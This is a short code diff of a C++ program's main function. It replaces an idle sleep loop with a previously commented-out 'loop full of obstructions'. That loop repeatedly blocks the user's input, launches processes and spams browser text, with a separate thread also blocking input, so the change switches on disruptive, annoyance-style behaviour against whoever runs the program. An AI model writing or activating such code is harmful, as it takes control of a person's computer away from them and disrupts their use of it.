@@ -110,10 +110,6 @@ int main(){
     std::thread T3(BlockUserInput);
     //Loop full of obstructions
     while(true){
-        Sleep(1000);
-    }
-    /*
-    while(true){
         BlockUserInput();
         STARTUPINFOA si = {sizeof(STARTUPINFO)};
         PROCESS_INFORMATION pi;
@@ -123,6 +119,5 @@ int main(){
         browserTextSpam();
         Sleep(1000);
     }
-    */
     return 0;
 }
